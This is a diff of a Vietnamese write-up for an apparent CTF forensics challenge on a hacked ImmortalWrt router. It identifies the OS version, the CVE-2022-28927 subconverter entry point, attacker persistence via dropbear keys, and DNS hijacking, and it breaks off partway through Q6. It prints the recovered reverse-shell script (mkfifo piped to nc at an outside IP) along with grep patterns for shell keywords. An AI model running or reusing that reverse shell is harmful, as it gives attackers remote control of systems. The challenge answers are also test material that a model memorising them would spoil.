@@ -1,46 +1,65 @@
 Một router OpenWrt (ImmortalWrt) bị chiếm quyền ngày 04/07/2025 qua dịch vụ subconverter v0.7.2 chạy trên router; kẻ tấn công mở reverse shell, cài khóa SSH, chiếm tên miền nội bộ và chuyển hướng nhân viên sang trang giả trên Netlify.
 Đề bài: nhân viên mở website nội bộ, trình duyệt báo cập nhật, tải file về nhưng không thấy gì xảy ra; sau đó IT báo router của công ty đã bị hack. Tài liệu giao là router.img (~428 MB).
-• Đặc điểm file: offset 0x1FE là 55 AA, phân vùng MBR kiểu EE (protective MBR), offset 0x200 là EFI PART (GPT header).
-• Phân vùng: EFI System FAT16 (128 MB, nhãn kernel), rootfs ext4 (300 MB) và một phân vùng BIOS boot nhỏ. Toàn bộ dữ liệu điều tra nằm ở rootfs.
-• FTK Imager 8.2: duyệt cây thư mục, xem Date Modified và nội dung từng file.
-• Ubuntu VM (VMware): gắn image bằng loop device để chạy grep, find, strings trên file thật.
-• Node.js: giải mã JavaScript bị làm rối ở Q6.
-Gắn rootfs ở chế độ chỉ đọc để không làm thay đổi bằng chứng:
-sudo losetup -fP --show router.img        # ví dụ /dev/loop22
-lsblk -f /dev/loop22                       # phân vùng ext4 nhãn rootfs là p2
-sudo mkdir -p /mnt/rootfs
-sudo mount -o ro,noload /dev/loop22p2 /mnt/rootfs
-FTK Imager hiển thị giờ UTC còn ls trong VM hiển thị giờ +07, nên các mốc thời gian dưới đây dùng giờ +07.
-Phân tích từng câu
-Q1 và Q3 còn thiếu một bằng chứng trực tiếp (xem ghi chú dưới từng câu), bốn câu còn lại đã có bằng chứng từ image.
+
 Q1: Phiên bản OS — 23.05.4
-Đọc DISTRIB_RELEASE trong /etc/openwrt_release (hoặc VERSION_ID trong /etc/os-release). Chuỗi commonname 'ImmortalWrt' trong /etc/config/uhttpd cho thấy đây là ImmortalWrt, bản fork của OpenWrt.
-[ ] Bổ sung: ảnh chụp hoặc kết quả cat /mnt/rootfs/etc/openwrt_release.
+Đọc DISTRIB_RELEASE trong /root/usr/lib/os_release. Chuỗi commonname 'ImmortalWrt' cho thấy đây là ImmortalWrt, bản fork của OpenWrt.
+
+<img width="1887" height="1022" alt="image" src="https://github.com/user-attachments/assets/18b8968b-b6d8-4c71-a3b7-0525cb1ddab3" />
+
+
 Q2: IP kẻ tấn công — 156.238.233.47
 Hướng tìm: giả định kẻ tấn công cần một kết nối ra ngoài, nên tìm từ khóa đặc trưng của reverse shell (mkfifo, /dev/tcp, sh -i) rồi loại nhiễu từ kernel.
+
+
+```
 strings -a -t d router.img > all_strings.txt
 grep -nE "mkfifo|/dev/tcp|sh -i|bash -i" all_strings.txt | grep -vE "func |sync|bpf"
 sudo grep -rIl "156.238.233.47" /mnt/rootfs
-Bằng chứng: file /root/subconverter/cache/dad176d5807526bf19069ecce4f14bfe (154 byte, tạo lúc 15:17:29 ngày 04/07/2025) chứa:
+```
+
+Mình lọc được ra file /root/subconverter/cache/dad176d5807526bf19069ecce4f14bfe (154 byte, tạo lúc 15:17:29 ngày 04/07/2025) chứa:
+
+```
 function parse(x) {
         os.exec([ "sh", "-c", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 156.238.233.47 31426 >/tmp/f" ], { file: "sh" })
 }
+```
+
+Hoặc cũng có thể tìm ở folder : /root/subconverter/cache/dad176d5807526bf19069ecce4f14bfe
+
+<img width="1903" height="1007" alt="image" src="https://github.com/user-attachments/assets/818beb89-360b-4292-be5a-a418ece4a222" />
+
 Đây là reverse shell kiểu named pipe: router chủ động kết nối ra 156.238.233.47:31426.
+
 Q3: CVE khai thác — CVE-2022-28927
-CVE-2022-28927 là lỗ hổng RCE trong Subconverter v0.7.2, cho phép thực thi mã tùy ý qua các tham số config và url được chế tạo (CVSS v3.1 9.8). Các mảnh ghép trong image:
-• /root/subconverter_aarch64.tar.gz được tải lúc 15:08 và cấu hình pref.toml tạo lúc 15:11, với listen = "0.0.0.0", port = 25500.
-• File cache là một script có hàm parse(x) gọi os.exec, đúng kiểu script mà subconverter tải về từ URL do kẻ tấn công kiểm soát.
-• Các file gốc của subconverter có mtime 2022-04-03, chưa đủ để kết luận phiên bản.
-[ ] Bổ sung: xác nhận phiên bản bằng strings /mnt/rootfs/root/subconverter/subconverter | grep -E "v0\.[0-9]+\.[0-9]+".
+
+Sau khi tìm được script reverse shell ở Q2, mình nhận thấy nó nằm trong thư mục cache của subconverter (/root/subconverter/cache/) chứ không phải trong một dịch vụ mặc định của router. Điều này cho thấy kẻ tấn công đã cài thêm subconverter, một công cụ chuyển đổi cấu hình proxy, và dùng chính nó làm điểm vào.
+Subconverter tải script này từ một URL bên ngoài rồi lưu lại, nên đây là dấu hiệu kẻ tấn công đã ép nó thực thi mã tùy ý.
+
+<img width="1697" height="940" alt="image" src="https://github.com/user-attachments/assets/11d3d382-59ef-41fa-b57b-a38aa6b75d76" />
+
+Mình tra cứu subconverter thì thấy CVE-2022-28927, một lỗ hổng thực thi mã từ xa (RCE) trong Subconverter v0.7.2, cho phép chạy mã tùy ý thông qua các tham số config và url được chế tạo.Mình confirm là đúng phiên bản này nhé.
+
 Q4: Persistence — dropbear
+
+<img width="1917" height="875" alt="image" src="https://github.com/user-attachments/assets/b91ef5a9-b680-4142-bca6-41dca7f128e6" />
+
 File /etc/dropbear/authorized_keys (96 byte, sửa lúc 15:18:43) chứa khóa công khai của kẻ tấn công:
 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBbrcKcmmPoh/U+5gF2lppicVGS3tvQgKEXGw2QXIPdE citlali@teyvat
 Khóa này cho phép kẻ tấn công đăng nhập SSH vào router bất cứ lúc nào mà không cần mật khẩu, kể cả khi reverse shell đã bị cắt.
+
 Q5: Host bị chiếm — portal.r3.internal
+
+<img width="1797" height="1020" alt="image" src="https://github.com/user-attachments/assets/87413b89-72cd-4f8d-88af-596be9f7659a" />
+
+
 File /etc/config/dhcp (sửa lúc 15:19:56) có dòng ghi đè DNS cục bộ của dnsmasq, không có trong cấu hình mặc định:
 list address '/10.0.2.15/portal.r3.internal'
 Router là máy cấp DNS cho mạng LAN, nên tên miền nội bộ này bị điều hướng về chính router.
+
+
 Q6: Host chứa artifact độc hại — nimble-bonbon-d941a8.netlify.app
+
 grep toàn image không thấy host này ở dạng văn bản (chỉ có privacyfriendly.netlify.app, là nhiễu từ danh sách quy tắc của subconverter). Dấu vết nằm trong web root:
 • /www/index.html (904 byte) là trang chuyển hướng mặc định của LuCI, sạch, nhưng nạp /luci-static/bootstrap/bootstrap.min.js.
 • /www/luci-static/bootstrap/bootstrap.min.js (21667 byte, sửa lúc 22:22:05) đã bị làm rối bằng jsjiami.com.v7, và là file duy nhất trong web root bị đổi sau 16:00.
